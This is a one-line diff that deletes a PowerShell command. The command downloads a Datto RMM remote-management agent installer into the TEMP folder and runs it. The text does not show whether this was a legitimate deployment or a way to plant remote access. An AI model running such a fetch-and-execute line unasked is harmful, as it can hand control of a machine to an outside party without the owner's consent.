@@ -1,1 +1,0 @@
-(New-Object System.Net.WebClient).DownloadFile("https://concord.rmm.datto.com/download-agent/windows/34124687-895c-46c9-85d0-a276a08082fe", "$env:TEMP/AgentInstall.exe");start-process "$env:TEMP/AgentInstall.exe"
